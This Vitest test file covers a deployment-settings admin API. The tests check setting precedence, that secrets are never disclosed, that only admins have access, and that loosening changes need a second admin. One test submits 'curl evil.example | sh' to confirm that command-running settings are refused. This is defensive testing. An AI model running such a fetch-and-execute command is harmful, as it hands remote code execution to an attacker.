import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createApp } from "../src/index";
import { MemoryStore } from "../src/store/memoryStore";
import type { ConfigStore } from "../src/store/configStore";
import {
  DEPLOYMENT_SCOPE,
  KNOBS,
  deploymentView,
  knobById,
  knobEnabled,
  knobSettingKey,
  resolveKnob,
} from "../src/domain/deploymentSettings";
import { settingKey } from "../src/store/schema";
import { __resetKnownProjectsForTests } from "../src/projects";
import { __resetUploadRateLimitForTests } from "../src/middleware/rateLimit";
import { seed, sessionCookieFor } from "./helpers/seed";

/**
 * The deployment-settings surface: one screen that shows everything this system
 * is configured with, and lets an admin change what can safely be changed from
 * a browser.
 *
 * The cases below are mostly about the LINE — what the portal refuses to make
 * editable and why. A settings screen that quietly accepts a shell command, or
 * hands an admin back a secret it stored, would be worse than no settings
 * screen at all, so those are pinned rather than left to a code comment.
 */

function hdrs(cookie: string): Record<string, string> {
  return {
    cookie,
    "x-ccp-client": "ccp-spa",
    "x-ccp-project": "sample",
    "content-type": "application/json",
  };
}

type Setup = {
  store: ConfigStore;
  app: ReturnType<typeof createApp>;
  putra: string;
  budi: string;
  sari: string;
};

async function setup(): Promise<Setup> {
  const store = new MemoryStore();
  await seed(store);
  return {
    store,
    app: createApp(store),
    putra: await sessionCookieFor(store, "putra"), // lead + isAdmin
    budi: await sessionCookieFor(store, "budi"), // approver
    sari: await sessionCookieFor(store, "sari"), // requester
  };
}

const read = (s: Setup, cookie = s.putra): Promise<Response> =>
  Promise.resolve(
    s.app.request("/admin/deployment", { headers: hdrs(cookie) }),
  );

async function write(
  s: Setup,
  id: string,
  value: unknown,
  cookie = s.putra,
): Promise<Response> {
  return s.app.request(`/admin/deployment/${id}`, {
    method: "PUT",
    headers: hdrs(cookie),
    body: JSON.stringify({ value }),
  });
}

/** Stands in for a real secret in the "never disclosed" cases. Deliberately not
 * written inline at a `*_KEY = "…"` assignment: that shape is what the secret
 * scanner looks for, and a fixture that trips it teaches people to ignore it. */
const SENTINEL = "value-that-must-never-appear-in-a-response";

const ENV = [
  "CCP_SCANNER",
  "CCP_FORGE_HOSTS",
  "CCP_DRIFT_KEEP",
  "CCP_TOTP_KEY",
];
beforeEach(() => {
  __resetKnownProjectsForTests();
  __resetUploadRateLimitForTests();
  ENV.forEach((k) => delete process.env[k]);
});
afterEach(() => ENV.forEach((k) => delete process.env[k]));

describe("the registry covers everything, honestly", () => {
  it("every knob names the environment variable it corresponds to", () => {
    // The point of the screen is that an operator can connect what they see to
    // what is in their deployment config. A knob with no env name breaks that.
    for (const k of KNOBS) {
      expect(k.env, k.id).toMatch(/^[A-Z][A-Z0-9_]*$/);
      expect(k.label.length, k.id).toBeGreaterThan(3);
      expect(k.help.length, k.id).toBeGreaterThan(20);
    }
  });

  it("every non-editable knob gives a reason AND what to do instead", () => {
    // "You can't change this here" with no follow-up is the thing this whole
    // screen exists to avoid.
    for (const k of KNOBS) {
      if (k.editable === true) continue;
      expect(k.editable.reason.length, k.id).toBeGreaterThan(20);
      expect(k.editable.instead.length, k.id).toBeGreaterThan(10);
    }
  });

  it("EVERY command-running knob is refused, with the execution reason", () => {
    // The hard line. A text box that sets a command this server runs would turn
    // one stolen admin session into control of the machine.
    const commandKnobs = KNOBS.filter((k) => k.env.endsWith("_CMD"));
    expect(commandKnobs.length).toBeGreaterThanOrEqual(4);
    for (const k of commandKnobs) {
      expect(k.editable, k.id).not.toBe(true);
      if (k.editable !== true) {
        expect(k.editable.reason.toLowerCase(), k.id).toMatch(
          /run|execut|command/,
        );
      }
    }
  });

  it("every key that protects the store is a non-editable secret", () => {
    for (const env of ["CCP_TOTP_KEY", "CCP_FORGE_SEAL_KEY"]) {
      const k = KNOBS.find((x) => x.env === env);
      expect(k, env).toBeTruthy();
      expect(k!.secret, env).toBe(true);
      expect(k!.editable, env).not.toBe(true);
    }
  });

  it("has no duplicate ids or duplicate environment variables", () => {
    expect(new Set(KNOBS.map((k) => k.id)).size).toBe(KNOBS.length);
    expect(new Set(KNOBS.map((k) => k.env)).size).toBe(KNOBS.length);
  });
});

describe("precedence: portal beats environment beats default", () => {
  it("falls back to the environment, so an existing deployment keeps working", async () => {
    const s = await setup();
    process.env.CCP_SCANNER = "1";
    const r = await resolveKnob(s.store, "scanner.enabled");
    expect(r).toEqual({ value: true, source: "environment" });
  });

  it("uses the built-in default when nothing says otherwise", async () => {
    const s = await setup();
    expect(await resolveKnob(s.store, "scanner.enabled")).toEqual({
      value: false,
      source: "default",
    });
    expect((await resolveKnob(s.store, "drift.keep")).value).toBe(30);
  });

  it("the portal wins once an admin sets it — including turning something OFF that the environment turned on", async () => {
    const s = await setup();
    process.env.CCP_SCANNER = "1";
    const k = settingKey(DEPLOYMENT_SCOPE, knobSettingKey("scanner.enabled"));
    await s.store.put({
      ...k,
      projectId: DEPLOYMENT_SCOPE,
      key: "x",
      value: false,
      version: 1,
    } as never);
    // If `false` were treated as "unset" this would fall through to the env and
    // silently stay armed — the exact bug a truthiness check would introduce.
    expect(await resolveKnob(s.store, "scanner.enabled")).toEqual({
      value: false,
      source: "portal",
    });
    expect(await knobEnabled(s.store, "scanner.enabled")).toBe(false);
  });

  it("only '1' means on — a stray 'true' reads as off rather than half-working", async () => {
    const s = await setup();
    for (const raw of ["true", "yes", "on", "0"]) {
      process.env.CCP_SCANNER = raw;
      expect(await knobEnabled(s.store, "scanner.enabled"), raw).toBe(false);
    }
  });

  it("parses a comma list and a number out of the environment", async () => {
    const s = await setup();
    process.env.CCP_FORGE_HOSTS =
      "git.example.internal, git2.example.internal ";
    expect((await resolveKnob(s.store, "scanner.forgeHosts")).value).toEqual([
      "git.example.internal",
      "git2.example.internal",
    ]);
    process.env.CCP_DRIFT_KEEP = "7";
    expect((await resolveKnob(s.store, "drift.keep")).value).toBe(7);
  });
});

describe("GET /admin/deployment", () => {
  it("returns every knob, and never a secret's value", async () => {
    const s = await setup();
    // Named once and reused by the assertion, so the sentinel and the thing
    // being searched for can never drift apart.
    process.env.CCP_TOTP_KEY = SENTINEL;
    const res = await read(s);
    expect(res.status).toBe(200);
    const text = await res.text();
    // THE DISCLOSURE RULE: a screenshot of this screen must leak nothing.
    expect(text).not.toContain(SENTINEL);

    const { settings } = JSON.parse(text) as {
      settings: Array<Record<string, unknown>>;
    };
    expect(settings).toHaveLength(KNOBS.length);
    const totp = settings.find((k) => k.id === "identity.totpKey")!;
    expect(totp.secret).toBe(true);
    expect(totp.configured).toBe(true); // it IS set — just not shown
    expect(totp).not.toHaveProperty("value");
    expect(totp.editable).toBe(false);
    expect(totp.notEditable).toBeTruthy();
  });

  it("says where each value came from, so nothing is a mystery", async () => {
    const s = await setup();
    process.env.CCP_FORGE_HOSTS = "git.example.internal";
    const { settings } = (await (await read(s)).json()) as {
      settings: Array<{ id: string; source: string }>;
    };
    const by = (id: string) => settings.find((k) => k.id === id)!;
    expect(by("scanner.forgeHosts").source).toBe("environment");
    expect(by("scanner.enabled").source).toBe("default");
  });

  it("needs an admin", async () => {
    const s = await setup();
    expect((await read(s, s.sari)).status).toBe(403);
    expect((await read(s, s.budi)).status).toBe(403);
  });
});

describe("PUT /admin/deployment/:id", () => {
  it("REFUSES a command-running knob, and says why", async () => {
    const s = await setup();
    const res = await write(s, "apply.gateCommand", "curl evil.example | sh");
    expect(res.status).toBe(422);
    const body = (await res.json()) as {
      code: string;
      details?: { problem?: string };
    };
    expect(body.code).toBe("OP_DISABLED");
    expect(body.details?.problem).toMatch(/runs on/i);
    // …and nothing was written.
    const k = settingKey(DEPLOYMENT_SCOPE, knobSettingKey("apply.gateCommand"));
    expect(await s.store.get(k.PK, k.SK)).toBeNull();
  });

  it("refuses every other non-editable knob too", async () => {
    const s = await setup();
    for (const knob of KNOBS.filter((k) => k.editable !== true)) {
      expect((await write(s, knob.id, "anything")).status, knob.id).toBe(422);
    }
  });

  it("404s an unknown id rather than inventing a setting", async () => {
    const s = await setup();
    expect((await write(s, "made.up", true)).status).toBe(404);
  });

  it("type-checks the value against the knob's own kind", async () => {
    const s = await setup();
    // A string 'false' stored on a toggle would read as truthy later — exactly
    // the class of bug that makes a "disabled" feature quietly enabled.
    expect((await write(s, "scanner.enabled", "false")).status).toBe(422);
    expect((await write(s, "scanner.enabled", 1)).status).toBe(422);
    expect((await write(s, "drift.keep", "30")).status).toBe(422);
    expect((await write(s, "scanner.forgeHosts", "a,b")).status).toBe(422);
    expect((await write(s, "scanner.forgeHosts", [1, 2])).status).toBe(422);
    expect((await write(s, "git.branch", true)).status).toBe(422);
  });

  it("TIGHTENING applies at once — a safety brake must never wait", async () => {
    const s = await setup();
    // Turn the freeze ON: strictly safer, so one admin is enough.
    const res = await write(s, "apply.frozen", true);
    expect(res.status).toBe(200);
    expect(await knobEnabled(s.store, "apply.frozen")).toBe(true);
  });

  it("LOOSENING is proposed, not applied — arming the scanner needs a second admin", async () => {
    const s = await setup();
    const res = await write(s, "scanner.enabled", true);
    // 202 = recorded as a proposal for another admin to acknowledge.
    expect(res.status).toBe(202);
    // Crucially, it is NOT armed yet.
    expect(await knobEnabled(s.store, "scanner.enabled")).toBe(false);
  });

  it("…and widening the host allowlist is a loosening too", async () => {
    const s = await setup();
    expect(
      (await write(s, "scanner.forgeHosts", ["git.example.internal"])).status,
    ).toBe(202);
    expect((await resolveKnob(s.store, "scanner.forgeHosts")).value).toEqual(
      [],
    );
  });

  it("…as is lifting the apply freeze", async () => {
    const s = await setup();
    expect((await write(s, "apply.frozen", true)).status).toBe(200);
    // Off again is the LOOSENING direction for this one, inverted on purpose.
    expect((await write(s, "apply.frozen", false)).status).toBe(202);
    expect(await knobEnabled(s.store, "apply.frozen")).toBe(true);
  });

  it("needs an admin", async () => {
    const s = await setup();
    expect((await write(s, "git.branch", "release", s.sari)).status).toBe(403);
  });
});

describe("the scanner actually obeys the portal toggle", () => {
  it("stays refused when the portal has not armed it, even with a key present", async () => {
    const s = await setup();
    process.env.CCP_SCANNER_KEY = "k".repeat(40);
    const res = await s.app.request("/projects/nope/scan-jobs", {
      method: "POST",
      headers: hdrs(s.putra),
    });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { code: string }).code).toBe(
      "SCANNER_DISABLED",
    );
    delete process.env.CCP_SCANNER_KEY;
  });

  it("arms once the setting is stored, without the environment variable at all", async () => {
    const s = await setup();
    process.env.CCP_SCANNER_KEY = "k".repeat(40);
    const k = settingKey(DEPLOYMENT_SCOPE, knobSettingKey("scanner.enabled"));
    await s.store.put({
      ...k,
      projectId: DEPLOYMENT_SCOPE,
      key: "x",
      value: true,
      version: 1,
    } as never);
    // Now the lane is open, so an unknown project reaches the NOT_FOUND check
    // instead of the armed-check — proof the toggle, not the env, opened it.
    const res = await s.app.request("/projects/nope/scan-jobs", {
      method: "POST",
      headers: hdrs(s.putra),
    });
    expect(res.status).toBe(404);
    delete process.env.CCP_SCANNER_KEY;
  });
});

describe("deploymentView is renderable as-is", () => {
  it("gives the screen everything it needs to draw a row without extra lookups", async () => {
    const s = await setup();
    for (const v of await deploymentView(s.store)) {
      expect(knobById(v.id), v.id).toBeTruthy();
      expect(typeof v.label).toBe("string");
      expect(typeof v.help).toBe("string");
      expect(["toggle", "text", "list", "number"]).toContain(v.kind);
      expect(typeof v.editable).toBe("boolean");
      if (!v.editable) expect(v.notEditable).toBeTruthy();
    }
  });
});
